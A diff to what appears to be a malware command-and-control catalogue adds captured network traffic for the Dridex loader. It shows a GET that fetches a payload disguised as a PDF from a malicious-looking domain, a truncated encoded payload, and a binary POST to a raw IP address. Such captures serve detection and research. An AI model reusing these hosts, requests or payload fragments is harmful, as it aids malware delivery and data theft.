@@ -412,6 +412,38 @@ data=oowJkdfLibIHB1Y62ffb2Cf5imwjN2x/vp1AE/SF8E9/fX1cnZaC6Bg7jRETqi6iAsAVATepyhS
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/donotgroup.png "Donotgroup")
 
+#### Dridex (loader)
+~~~
+GET /function.php?3b3988df-c05b-4fca-93cc-8f82af0e3d2b HTTP/1.1
+Host: masteronare.com
+Connection: Keep-Alive
+
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 05 Nov 2019 20:32:12 GMT
+Content-Type: application/octet-stream
+Content-Length: 455830
+Connection: keep-alive
+Keep-Alive: timeout=60
+Accept-Ranges: bytes
+Content-Disposition: attachment; filename=5dc1dc4cd884c.pdf
+
+7Y2FGZnZ2enZ2dnZydnZ2dhgYD3Z2e1B2dnZ2dnZ2dnZmdnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnYPdnZ2dnYDUUJQA3ZDdll5flVQdWN6B19hcF9HVE51QFRaDllUWnFDfnB5X1VaAkFTdHVebWR1TlNgA1BWYANQZXIOY35wBkFtcGJCc2YHfH12dnZ2dnZ2dnZ1XxxRchx9bV5RVWRgblkFB1tafQ5DdlsAXlVjBW5ZBQd0b0FxQ3J9XlFVZn1SD1oFQ1p9DkMCR1F0VWRGblkFB1tafQJDX31eUVVmfVIAYAdcWn0OQ3ZbAFtVZGRuWQUHdG9CeUN9fV5RVWZ9UgIFB1xafQ5DYlpbXVZ0YG5ZBQd2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZicmJ2dnJAdXV2dXJRenFTdnZ2dnZ2dnZ2dnNQdnZ+X3RAcn52dnRAdkB2dlh9cn
+~~~
+~~~
+POST / HTTP/1.1
+Host: 194.99.22.193
+Content-Length: 3442
+Connection: Close
+Cache-Control: no-cache
+
+..5......[,h?])moo..;.Y..
+v..jq..........G.0vR...@ ..6tw..<.{It.y
+#l.K..8....v...v......=.+.......Q..v..P5...y...uhTqR.
+..v.QoM..o.I.l...>.....p.....Rt...............
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/dridex.png "Dridex")
+
 #### Dunihi
 ~~~
 POST /is-ready HTTP/1.1
